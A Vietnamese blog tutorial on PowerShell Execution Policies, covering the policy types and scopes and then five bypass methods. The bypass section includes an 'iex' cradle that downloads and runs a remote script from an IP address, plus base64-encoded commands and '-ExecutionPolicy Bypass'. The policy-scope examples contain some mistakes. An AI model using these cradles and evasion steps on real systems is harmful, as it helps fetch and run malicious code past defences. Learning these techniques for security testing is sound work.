![](https://images.viblo.asia/f1f24986-70d7-4752-a7da-62fb31c18016.png)

# Tổng quan về Powershell

## Lịch sử

Năm 2002, Snover của Microsoft nhận ra rằng Command Prompt (cmd.exe) không có khả năng viết script và tự động hóa các tác vụ tốt như shell của Linux (lẽ dĩ nhiên). Để thay đổi điều này, ông đã phát hành tài liệu mang tên Monad, phác thảo các kế hoạch về một công cụ thay thế - thứ sau này sẽ trở thành Powershell. 

Từ năm 2006, Monad được đổi tên thành Powershell với số hiệu phiên bản 1.0. Kể từ đó, nó liên tục được bổ sung thêm các tính năng và chuyển thành một dự án Open source. 

Powershell hiện tại hỗ trợ cả 3 nền tảng Mac - Linux - Windows. 

## Sự khác nhau giữa Powershell và CMD

Để so sánh Powershell và CMD là một điều thực sự rất khó vì cơ bản chúng không giống nhau. Mỗi công cụ đều có những lợi ích riêng và cách sử dụng tùy theo từng trường hợp cụ thể. Tuy nhiên nhìn ở góc độ nào đó , Powershell như một bản nâng cấp ưu việt của CMD với  nhiều tính năng và chức năng được bổ sung. Powershell có giao diện đồ họa tốt hơn, hỗ trợ các tác vụ tự động hóa tốt hơn, đa nền tảng hơn,được Microsoft chiều hơn (ưu tiên viết riêng một IDE Powershell ISE) , cung cấp khả năng debug tốt hơn.. Nói chung là "xịn" hơn.

## Tại sao Hacker lại “thích” Powershell ?

Đơn giản vì Powershell rất mạnh mẽ và cực kỳ thân thiện với Kernel, nó có thể giao tiếp thoải mái với Windows API , tự động hóa  hoàn toàn các tác vụ quản trị trên máy tính,hỗ trợ các câu lệnh che dấu bản thân nó trước các phần mềm diệt Virus (trước khi AMSI xuất hiện).  Kiểm soát được Powershell đồng nghĩa với việc kiểm soát được máy tính nạn nhân. Microsoft  nhận thấy điều này từ rất sớm, qua đó họ phát triển nhiều tính năng nhằm hỗ trợ an toàn cho người sử dụng, một trong số đó là  `Powershell Execution Policy`.

## Vậy Powershell Execution Policies là gì ?

Powershell Execution Policies là một tính năng bảo mật được tích hợp sẵn trên Powershell nhằm ngăn chặn việc người dùng vô tình thực thi các tập lệnh độc hại. Tuy nhiên, không giống như [Powershell Language Mode ](https://viblo.asia/p/bypass-applocker-tren-windows-XL6lAen4lek#_41-powershell-constrained-language-mode-8)  đóng vai trò như một Security Policies , Execution Policies rất dễ tính , nó cung cấp sẵn nhiều tùy chọn cho phép người dùng hay kẻ tấn công bỏ qua nó.

Để kiểm tra trạng thái Policies, ta sử dụng câu lệnh sau trên Powershell

```powershell 
Get-ExecutionPolicy
```

```
PS C:\Users\viblo> Get-ExecutionPolicy
Restricted
```

Ở trạng thái mặc định này, khi chạy các tệp lệnh Powershell , hệ thống sẽ trả về thông báo lỗi như sau 

![](https://images.viblo.asia/1ae0cd88-3cc3-4921-8f2b-5abb676b50fa.png)

## Cấu hình Powershell Execution Policies

Để cấu hình Powershell Execution Policies ta sử dụng câu lệnh sau 

```powershell
Set-ExecutionPolicy -ExecutionPolicy [Policy Name]
```

Tuy nhiên việc thiết lập này cần sử dụng quyền Administrator do nó can thiệp 
trực tiếp vào Registry `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell` . 

Nếu ta cố gắng thực hiện với tài khoản thông thường, hệ thống sẽ trả về thông báo lỗi sau 

![](https://images.viblo.asia/5e515731-3439-4855-b7d1-feeb5d0a8a7e.png)

Với mỗi mục đích khác nhau, Microsoft lại cung cấp nhiều tùy chọn Powershell Policy Name khác nhau. Việc hiểu rõ về chúng là rất cần thiết trong quá trình tấn công . Ta cùng điểm qua các loại Policy đó với danh sách dưới đây 

### AllSigned

* Có thể chạy script 
* Yêu cầu tất cả các scripts và tệp cấu hình phải được signed bởi trusted publisher, bao gồm cả những script mà bạn viết trên chính máy tính khởi chạy 
* Nhắc nhở khi người dùng chạy các scripts từ publisher chưa phân loại là đáng tin cậy 
* Cảnh báo rủi ro khi chạy các scripts đã sign nhưng độc hại 

```powershell
Set-ExecutionPolicy -ExecutionPolicy AllSigned
```

### Bypass

* Không có gì bị chặn, không có cảnh báo, không có lời nhắc nhở (3 không) 
* Chỉ sử dụng tính năng này, khi hệ thống đã có những hệ thống bảo mật thay thế 

```powershell
Set-ExecutionPolicy -ExecutionPolicy bypass
```

### Default

* Trên máy Windows thông thường, Policy Default ở trạng thái Restricted
* Trên Windows Server, Policy Default ở trạng thái RemoteSigned

### RemoteSigned

* Đây là policy mặc định trên Powershell của Windows Server 
* Có thể chạy scripts
* Với các scripts được tải xuống từ internet được yêu cầu cung cấp chữ ký từ một trusted publisher (Các scripts được tạo ra trên chính máy tính đó thì không cần cung cấp)
* Thông báo rủi ro khi cố gắng chạy các script không cung cấp được chữ ký hợp lệ hoặc phát hiện tệp tin đó là độc hại 

```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
```

### Restricted

* Đây là policy mặc định trên Powershell của Windows client 
* Cho phép thực hiện các command đơn lẻ, nhưng không cho phép chạy các scripts 
* Ngăn chặn việc chạy các scripts rủi ro cao ở các định dạng `.ps1` . `.psm1` , `ps1xml` 

```powershell
Set-ExecutionPolicy -ExecutionPolicy Restricted
```

### Undefined

* Không phát hiện policy nào trong phạm vi hiện tại, tự động đổi policy về trạng thái mặc định (Restricted với Windows clients và RemoteSigned với Windows Server)


```powershell
Set-ExecutionPolicy -ExecutionPolicy Undefined
```

### Unrestricted

* Cho phép chạy các script mà không yêu cầu chữ ký hợp lệ 
* Cảnh báo người dùng trước khi chạy các scripts và tệp cấu hình không tới từ vùng mạng nội bộ

```powershell
Set-ExecutionPolicy -ExecutionPolicy Unrestricted
```

## Đối tượng bị "áp" Powershell Policies

Để kiểm tra việc thiết lập Policy cho các Object khác nhau, ta sử dụng câu lệnh sau 

```powershell
Get-ExecutionPolicy -List
```
![](https://images.viblo.asia/a958c477-7468-4d92-aa11-42e79db3f7ca.png)

### MachinePolicy

Thiết lập Policy cho toàn bộ Users tồn tại trên máy tính 

```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

### UserPolicy

Thiết lập Policy cho từng User hiện diện trên máy tính 

```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope UserPolicy
```

### Process

Thiết lập Policy này chỉ ảnh hưởng tới Session Powershell hiện tại do nó được lưu trữ trong biến tạm`$env:PSExecutionPolicyPreference` . Sẽ biến mất khi Powershell ngắt kết nối 


### CurrentUser

Thiết lập Policy này chỉ ảnh hưởng đến người dùng hiện tại

```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

### LocalMachine

Chính sách thực thi này ảnh hưởng đến tất cả người dùng trên máy tính hiện tại

```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine
```

Để xóa bỏ Policy vừa tạo, ta dùng command sau

```powershell
Set-ExecutionPolicy -ExecutionPolicy Undefined -Scope LocalMachine

```
# Bypass Powershell Execution Policies 
Sau khi tìm hiểu rõ hơn về `Powershell Execution Policies` , ta có thể lợi dụng các tính năng sẵn có trên nền tảng này để thực hành bypass nó

Đầu tiên, ta tạo một script như sau (**virus.ps1**)

```powershell
Write-Host "Hello, Viblo.asia"
```

Đồng thời đảm bảo Policy về trạng thái `Restricted`

![](https://images.viblo.asia/f003c694-05fd-42ec-a39f-fa4fa1aaf67f.png)


### 1. Paste script vào Powershell

Cách này nghe có vẻ "củ chuối" nhưng đáng ngạc nhiên là nó rất hiệu quả. Thậm chí nó có thể dùng để bypass luôn AMSI (một thứ rất xịn) 😳

```
PS C:\Users\viblo\Desktop> Write-Host "Hello , Viblo.asia"
Hello , Viblo.asia
```

### 2.  Sử dụng echo kết hợp với PIPE 

```
echo 'Write-Host "Hello , Viblo.asia"' | PowerShell.exe -noprofile -
```

hoặc bypass thông qua một biến thể khác với `Get-Content`

```powershell 
Get-Content .virus.ps1 | PowerShell.exe -noprofile -
```

### 3. Bypass thông qua Invoke Expression

Kỹ thuật này sử dụng Invoke-Expression (iex) để tải xuống scripts PowerShell từ internet và thực thi trực tiếp nó mà không cần phải ghi vào Disk (kỹ thuật này vô hiệu hóa các phần mềm diệt Virus thông thường)

```powershell
powershell -nop -c "iex (New-Object Net.WebClient).DownloadString ('http://10.0.37.216:8080/virus.ps1')"
```

### 4. Sử dụng EncodeCommand Switch

Kỹ thuật này khá giống với cái cách ta Paste trực tiếp command vào Powershell , nhưng thay vì đó tiến hành encode base64 để giảm thiểu khả năng bị phát hiện bởi người dùng và cũng để tăng tính toàn vẹn cho mã khai thác 

```powershell
$command = "write-output 'Hello, Viblo.asia'" 
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
$encodedCommand = [Convert]::ToBase64String($bytes) 
write-output $encodedCommand 
powershell.exe -EncodedCommand $encodedCommand
```

![](https://images.viblo.asia/6a6dafdc-b23f-4a8c-8654-19dda223ab46.png)


### 5. Sử dụng Execution Policy Flag  

Kỹ thuật này sử dụng  policy của chính Powershell để thực thi mã độc. Đây là phương pháp mình sử dụng nhiều nhất trong quá trình Red Team và Pentest vì tính đơn giản và hiệu quả của nó. Để tiến hành, ta có thể chạy trực tiếp mã khai thác với câu lệnh sau (*với Flag bypass*)

```powershell
powerShell.exe -ExecutionPolicy Bypass -File .virus.ps1
```
Hoặc gián tiếp thông qua Powershell 

```powershell 
 powershell -exec bypass powershell
 .\virus.ps1 
```
![](https://images.viblo.asia/a77c9772-0ec4-4b9c-ac96-6e25fa95358c.png)

Ngoài ra ta có thể sử dụng cách tương tự với các flag `Unrestricted` và `Remote-Signed`.

# Tổng kết

Qua bài viết, chúng ta đã cùng nhau tìm hiểu thêm về Powershell Execution Policy và các cách thức để đơn giản  để bypass nó. Hi vọng sau bài viết, chúng ta đã hiểu hơn về tính năng vô cùng thú vị này. Hẹn gặp lại mọi người ở các bài viết tiếp theo. 

**Tham khảo**

https://stackoverflow.com/questions/67270197/windows-powershell-policy-execution-bypass
https://technet.microsoft.com/en-us/library/hh849812.aspx

https://technet.microsoft.com/en-us/library/hh849893.aspx

https://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html

https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2
https://technet.microsoft.com/en-us/library/hh849694.aspx